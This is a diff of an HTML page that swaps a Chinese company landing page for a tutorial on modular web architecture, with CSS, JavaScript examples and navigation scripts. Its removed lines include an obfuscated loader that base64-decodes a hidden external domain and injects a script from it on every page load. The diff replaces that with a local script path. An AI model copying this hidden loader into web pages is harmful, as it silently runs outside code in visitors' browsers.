@@ -3,132 +3,86 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>视界前瞻：未来数字体验</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>现代Web架构：模块化设计</title>
     <style>
-        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
             font-family: 'Roboto', sans-serif;
-            /* 现代无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #F0F4F8;
-            /* 柔和的浅灰蓝色背景 */
-            color: #3A4750;
-            /* 深板岩色文本 */
+            background-color: #F8F9FA;
+            /* 极浅灰色背景 */
+            color: #34495E;
+            /* 深灰蓝色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
             overflow-x: hidden;
-            /* 防止横向滚动条 */
         }
 
-        /* 容器 - 保持内容居中但允许背景元素溢出 */
         .container {
             max-width: 90%;
             margin: 0 auto;
             padding: 30px 0;
-            position: relative;
-            /* 用于定位内部元素 */
-            z-index: 1;
-            /* 确保内容在背景之上 */
         }
 
-        /* 头部 - 大胆的非对称设计 */
         header {
-            background-color: #3A4750;
-            /* 深板岩色背景 */
-            color: #FFFFFF;
-            padding: 60px 20px;
+            background-color: #FFFFFF;
+            /* 纯白色头部背景 */
+            padding: 50px 20px;
             text-align: center;
+            border-bottom: 2px solid #E0E0E0;
+            /* 细底部边框 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
             position: relative;
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border-bottom-left-radius: 80px;
-            /* 独特的底部圆角 */
-            border-top-right-radius: 80px;
-            /* 独特的顶部圆角 */
-            margin-bottom: 40px;
         }
 
         header::before {
-            /* 抽象的背景形状 */
+            /* 顶部几何图案 */
             content: '';
             position: absolute;
-            top: -50px;
-            left: -50px;
-            width: 200px;
-            height: 200px;
-            background: #FF6B6B;
-            /* 强调色 */
-            border-radius: 50%;
-            transform: rotate(20deg);
-            opacity: 0.2;
-            z-index: 0;
-        }
-
-        header::after {
-            /* 另一个抽象的背景形状 */
-            content: '';
-            position: absolute;
-            bottom: -80px;
-            right: -80px;
-            width: 300px;
-            height: 300px;
-            background: #A2D9CE;
-            /* 次强调色 */
-            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
-            /* 不规则形状 */
-            transform: rotate(-45deg);
-            opacity: 0.15;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at top left, rgba(102, 187, 106, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at bottom right, rgba(102, 187, 106, 0.05) 0%, transparent 20%);
+            background-size: 100px 100px;
             z-index: 0;
         }
 
         header h1 {
             margin: 0;
             font-family: 'Montserrat', sans-serif;
-            /* 大胆标题字体 */
-            font-size: 3.2em;
-            color: #FF6B6B;
-            /* 强调色标题 */
-            letter-spacing: 3px;
+            font-size: 3em;
+            color: #34495E;
+            letter-spacing: 1px;
             text-transform: uppercase;
             position: relative;
             z-index: 1;
         }
 
         header p {
-            font-size: 1.3em;
-            color: #E0E0E0;
+            font-size: 1.2em;
+            color: #78909C;
             margin-top: 15px;
             position: relative;
             z-index: 1;
         }
 
-        /* 导航菜单 - 浮动胶囊条 */
         nav {
             background-color: #FFFFFF;
             text-align: center;
             padding: 15px 0;
-            margin-top: -80px;
-            /* 向上偏移，与头部重叠 */
-            border-radius: 50px;
-            /* 胶囊形状 */
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            margin-top: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
             position: sticky;
             top: 20px;
-            /* 距离顶部20px固定 */
             z-index: 1000;
-            width: 80%;
-            /* 宽度略小 */
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-            display: flex;
-            /* 确保内部flex布局 */
-            justify-content: space-around;
-            align-items: center;
         }
 
         nav ul {
@@ -136,331 +90,285 @@
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: space-around;
+            justify-content: center;
             flex-wrap: wrap;
-            width: 100%;
         }
 
         nav ul li {
-            margin: 0 10px;
+            margin: 0 18px;
         }
 
         nav ul li a {
-            background-color: transparent;
-            color: #3A4750;
+            color: #546E7A;
             /* 默认文字颜色 */
             text-decoration: none;
-            padding: 10px 20px;
-            border-radius: 30px;
-            /* 胶囊按钮 */
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            padding: 10px 0;
+            position: relative;
             display: inline-block;
-            font-weight: bold;
+            font-weight: 600;
             font-size: 1em;
-            border: 2px solid transparent;
-            /* 默认透明边框 */
+            transition: color 0.3s ease;
+        }
+
+        nav ul li a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 3px;
+            background-color: #66BB6A;
+            /* 强调色：亮绿色 */
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            transition: width 0.3s ease;
+        }
+
+        nav ul li a:hover::after,
+        nav ul li a:focus::after {
+            width: 100%;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #FF6B6B;
-            /* 强调色背景 */
-            color: #FFFFFF;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-            border: 2px solid #FF6B6B;
-            /* 强调色边框 */
+            color: #66BB6A;
         }
 
-        /* 内容区 - 模块化与非对称布局 */
+        nav ul li a.active {
+            /* 激活状态样式 */
+            color: #66BB6A;
+        }
+
+        nav ul li a.active::after {
+            width: 100%;
+        }
+
         main {
-            padding-top: 60px;
-            /* 留出导航条重叠的空间 */
+            padding-top: 30px;
+            display: grid;
+            /* 网格布局 */
+            grid-template-columns: 1fr;
+            /* 默认单列 */
+            gap: 30px;
+            /* 网格间距 */
+        }
+
+        @media (min-width: 768px) {
+            main {
+                grid-template-columns: 1fr 1fr;
+                /* 768px以上两列 */
+            }
+        }
+
+        @media (min-width: 1024px) {
+            main {
+                grid-template-columns: 1fr 1fr 1fr;
+                /* 1024px以上三列 */
+            }
         }
 
         section {
             background-color: #FFFFFF;
-            margin-bottom: 50px;
-            /* 增加间距 */
-            padding: 40px;
-            border-radius: 15px;
+            padding: 35px;
+            border-radius: 10px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
             position: relative;
             overflow: hidden;
-        }
-
-        section:nth-child(odd) {
-            /* 奇数section向右偏移 */
-            margin-left: 0;
-            margin-right: 5%;
-            border-top-right-radius: 50px;
-            border-bottom-left-radius: 50px;
-        }
-
-        section:nth-child(even) {
-            /* 偶数section向左偏移 */
-            margin-left: 5%;
-            margin-right: 0;
-            border-top-left-radius: 50px;
-            border-bottom-right-radius: 50px;
-        }
-
-        section::before {
-            /* 内部装饰性边框 */
-            content: '';
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            width: calc(100% - 40px);
-            height: calc(100% - 40px);
-            border: 1px dashed #A2D9CE;
-            /* 次强调色虚线 */
-            border-radius: inherit;
-            /* 继承父元素的圆角 */
-            pointer-events: none;
+            border-left: 5px solid #90A4AE;
+            /* 柔和的左侧边框 */
         }
 
         section h2 {
             font-family: 'Montserrat', sans-serif;
-            font-size: 2.5em;
-            color: #FF6B6B;
-            /* 强调色标题 */
+            font-size: 2em;
+            color: #34495E;
             margin-top: 0;
             margin-bottom: 20px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border-bottom: 2px solid #E0E0E0;
-            /* 细分隔线 */
+            border-bottom: 1px dashed #E0E0E0;
+            /* 虚线分隔 */
             padding-bottom: 10px;
         }
 
         section h3 {
-            font-size: 1.6em;
-            color: #3A4750;
-            margin-top: 30px;
-            margin-bottom: 15px;
+            font-size: 1.5em;
+            color: #66BB6A;
+            /* 强调色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
         }
 
         section p {
-            font-size: 1.1em;
+            font-size: 1.05em;
             color: #546E7A;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 30px auto;
-            border-radius: 20px;
-            /* 大圆角图片 */
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
-            border: 3px solid #A2D9CE;
-            /* 次强调色边框 */
+            margin: 25px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid #CFD8DC;
+            /* 柔和边框 */
         }
 
-        .service-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
+        pre {
+            background-color: #263238;
+            /* 深炭灰色代码背景 */
+            color: #A2F2A2;
+            /* 亮绿色代码文本 */
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
+            margin-bottom: 25px;
+            border: 1px solid #66BB6A;
+            /* 强调色边框 */
+            box-shadow: 0 0 10px rgba(102, 187, 106, 0.4);
         }
 
-        .service-item {
-            background-color: #F8F8F8;
-            /* 服务项背景 */
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
+            color: #A2F2A2;
+        }
+
+        pre code {
+            color: #A2F2A2;
+        }
+
+        footer {
+            background-color: #34495E;
+            /* 深灰蓝色页脚背景 */
+            color: #F8F9FA;
+            padding: 40px 0;
             text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border: 1px solid #E0E0E0;
+            font-size: 0.9em;
+            margin-top: 50px;
+            border-top: 2px solid #66BB6A;
+            /* 强调色顶部边框 */
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
         }
 
-        .service-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
-        }
-
-        .service-item h3 {
-            margin-top: 0;
-            margin-bottom: 10px;
-            color: #FF6B6B;
-            /* 强调色 */
-        }
-
-        .service-item p {
-            font-size: 0.95em;
-            color: #546E7A;
-        }
-
-        .contact-info p {
-            margin-bottom: 12px;
-            font-size: 1.1em;
-            color: #546E7A;
-        }
-
-        .contact-info a {
-            color: #FF6B6B;
+        .footer-links a {
+            color: #F8F9FA;
             text-decoration: none;
+            margin: 0 18px;
+            font-size: 1.1em;
             transition: color 0.3s ease;
         }
 
-        .contact-info a:hover {
-            color: #E65C5C;
-        }
-
-        /* 页脚 - 简洁与抽象 */
-        footer {
-            background-color: #3A4750;
-            /* 深板岩色背景 */
-            color: #E0E0E0;
-            padding: 40px 0;
-            text-align: center;
-            font-size: 0.95em;
-            margin-top: 60px;
-            border-top-left-radius: 80px;
-            /* 独特的顶部圆角 */
-            border-bottom-right-radius: 80px;
-            /* 独特的底部圆角 */
-            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        footer::before {
-            /* 抽象的背景形状 */
-            content: '';
-            position: absolute;
-            top: -30px;
-            right: -30px;
-            width: 150px;
-            height: 150px;
-            background: #A2D9CE;
-            /* 次强调色 */
-            border-radius: 50%;
-            transform: rotate(60deg);
-            opacity: 0.1;
-            z-index: 0;
-        }
-
-        .social-links a {
-            color: #E0E0E0;
-            text-decoration: none;
-            margin: 0 20px;
-            font-size: 1.5em;
-            transition: color 0.3s ease, transform 0.2s ease;
-        }
-
-        .social-links a:hover {
-            color: #FF6B6B;
-            /* 强调色 */
-            transform: translateY(-5px) scale(1.1);
-        }
-
-        /* 进度条 */
-        #progressBarContainer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 6px;
-            /* 稍微粗一点 */
-            background-color: #E0E0E0;
-            z-index: 1002;
-        }
-
-        #progressBar {
-            height: 100%;
-            width: 0%;
-            background-color: #FF6B6B;
-            /* 强调色 */
-            transition: width 0.1s linear;
+        .footer-links a:hover {
+            color: #66BB6A;
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <div id="progressBarContainer">
-        <div id="progressBar"></div>
-    </div>
-
     <header>
         <div class="container">
-            <h1>视界前瞻</h1>
-            <p>未来数字体验的构筑者</p>
+            <h1>现代Web架构</h1>
+            <p>模块化设计与开发实践</p>
         </div>
     </header>
 
     <div class="container">
         <nav id="mainNav">
             <ul>
-                <li><a href="#about-vision">关于视界</a></li>
-                <li><a href="#our-focus">核心焦点</a></li>
-                <li><a href="#contact-us">联系我们</a></li>
+                <li><a href="#introduction">引言</a></li>
+                <li><a href="#modules">模块化</a></li>
+                <li><a href="#patterns">设计模式</a></li>
+                <li><a href="#performance">性能优化</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="about-vision">
-                <h2>关于视界：创新与洞察</h2>
-                <img src="https://picsum.photos/300/200?random=1&tag=abstract-vision-01" alt="抽象愿景图"
+            <section id="introduction">
+                <h2>引言：可伸缩架构</h2>
+                <img src="https://picsum.photos/300/200?random=1&tag=architecture-diagram-abc" alt="架构图"
                     class="random-image">
-                <p>视界前瞻致力于通过前沿技术和创新思维，为企业和个人提供独特的数字解决方案。我们相信，每一次技术突破都应带来更广阔的视野和更深刻的洞察。</p>
-                <p>我们汇聚了行业顶尖的专家团队，以客户需求为导向，不断探索未知，赋能未来。</p>
+                <p>构建可伸缩、可维护的Web应用是现代开发的核心挑战。本指南将深入探讨模块化设计原则，帮助您构建健壮且适应未来需求的应用。</p>
+                <p>我们将从基础概念开始，逐步深入到高级设计模式和性能优化策略。</p>
             </section>
 
-            <section id="our-focus">
-                <h2>核心焦点：赋能数字转型</h2>
-                <p>我们专注于以下领域，为您提供定制化、高价值的服务：</p>
-                <div class="service-grid">
-                    <div class="service-item">
-                        <h3>沉浸式体验设计</h3>
-                        <p>打造引人入胜的VR/AR应用和交互式数字内容。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>AI驱动型解决方案</h3>
-                        <p>利用人工智能提升业务效率，实现智能自动化和数据预测。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>区块链安全架构</h3>
-                        <p>构建去中心化、高安全性的区块链应用和系统。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>云原生部署优化</h3>
-                        <p>提供高效的云平台迁移、容器化和DevOps实践。</p>
-                    </div>
-                </div>
-                <img src="https://picsum.photos/300/200?random=2&tag=digital-transformation-02" alt="数字转型图"
-                    class="random-image">
+            <section id="modules">
+                <h2>模块化：代码组织艺术</h2>
+                <img src="https://picsum.photos/300/200?random=2&tag=code-blocks-def" alt="代码块" class="random-image">
+                <p>模块化是管理复杂代码库的关键。通过将代码分解为独立的、可复用的模块，可以提高代码的可读性、可维护性和协作效率。</p>
+                <pre><code>// ES6 模块导出
+export const PI = 3.14159;
+
+export function add(a, b) {
+    return a + b;
+}
+
+// ES6 模块导入
+import { PI, add } from './math.js';
+console.log(add(PI, 5));</code></pre>
+                <p>模块化不仅限于JavaScript，也适用于CSS和HTML结构。</p>
             </section>
 
-            <section id="contact-us">
-                <h2>联系我们：共创未来</h2>
-                <p>我们期待与您建立联系，共同开启数字未来。</p>
-                <div class="contact-info">
-                    <p><strong>地址：</strong> 未来科技园A区707室</p>
-                    <p><strong>电话：</strong> <a href="tel:+861055558888">+86 10 5555 8888</a></p>
-                    <p><strong>邮箱：</strong> <a href="mailto:info@visionarytech.com">info@visionarytech.com</a></p>
-                    <p><strong>工作时间：</strong> 周一至周五 9:30 - 18:30</p>
-                    <p>
+            <section id="patterns">
+                <h2>设计模式：通用解决方案</h2>
+                <img src="https://picsum.photos/300/200?random=3&tag=design-patterns-ghi" alt="设计模式"
+                    class="random-image">
+                <p>设计模式是软件开发中常见问题的通用、可重用的解决方案。理解并应用这些模式可以帮助我们编写更优雅、更健壮的代码。</p>
+                <p>例如，观察者模式在事件驱动的系统中非常常见，而工厂模式则用于创建对象。</p>
+                <pre><code>// 简单的观察者模式示例
+class Subject {
+    constructor() {
+        this.observers = [];
+    }
 
-                        <img src="https://placehold.co/300x200/A2D9CE/3A4750?text=公司位置示意图" alt="公司位置示意图"
-                            class="random-image">
-                    </p>
-                </div>
+    addObserver(observer) {
+        this.observers.push(observer);
+    }
+
+    notify(data) {
+        this.observers.forEach(observer => observer.update(data));
+    }
+}
+
+class Observer {
+    constructor(name) {
+        this.name = name;
+    }
+
+    update(data) {
+        console.log(`${this.name} 收到更新: ${data}`);
+    }
+}
+
+const subject = new Subject();
+const obs1 = new Observer('观察者A');
+const obs2 = new Observer('观察者B');
+
+subject.addObserver(obs1);
+subject.addObserver(obs2);
+
+subject.notify('新消息到达！');</code></pre>
+            </section>
+
+            <section id="performance">
+                <h2>性能优化：提升用户体验</h2>
+                <img src="https://picsum.photos/300/200?random=4&tag=performance-speed-jkl" alt="性能速度"
+                    class="random-image">
+                <p>优化Web应用性能对于提升用户体验至关重要。这包括减少加载时间、提高响应速度和确保流畅的动画。</p>
+                <p>常见的优化技术包括代码分割、懒加载、图片优化和使用CDN等。</p>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 视界前瞻. 探索无止境.</p>
-            <div class="social-links">
-                <a href="#" target="_blank">🌐</a> |
-                <a href="#" target="_blank">💡</a> |
-                <a href="#" target="_blank">🚀</a>
+            <p>&copy; 2025 Web架构指南. 版权所有.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">资源</a> |
+                <a href="#" target="_blank">联系</a> |
+                <a href="#" target="_blank">关于</a>
             </div>
         </div>
     </footer>
@@ -485,21 +393,38 @@
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20, // 考虑导航栏高度和额外间距
+                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20,
                             behavior: 'smooth'
                         });
                     }
                 });
             });
 
-            const progressBar = document.getElementById('progressBar');
+            const sections = document.querySelectorAll('main section');
+            const navLinks = document.querySelectorAll('nav ul li a');
 
-            window.addEventListener('scroll', function () {
-                const totalHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
-                const scrolled = window.pageYOffset;
-                const progress = (scrolled / totalHeight) * 100;
-                progressBar.style.width = progress + '%';
-            });
+            function highlightNavLink() {
+                let currentSectionId = '';
+
+                sections.forEach(section => {
+                    const sectionTop = section.offsetTop - document.querySelector('nav').offsetHeight - 30;
+                    const sectionBottom = sectionTop + section.offsetHeight;
+
+                    if (window.pageYOffset >= sectionTop && window.pageYOffset < sectionBottom) {
+                        currentSectionId = section.id;
+                    }
+                });
+
+                navLinks.forEach(link => {
+                    link.classList.remove('active');
+                    if (link.getAttribute('href').substring(1) === currentSectionId) {
+                        link.classList.add('active');
+                    }
+                });
+            }
+
+            window.addEventListener('scroll', highlightNavLink);
+            highlightNavLink();
         });
     </script>
     <script>
@@ -507,53 +432,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9pMW8zcDV1Lm9ia2V4cC5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
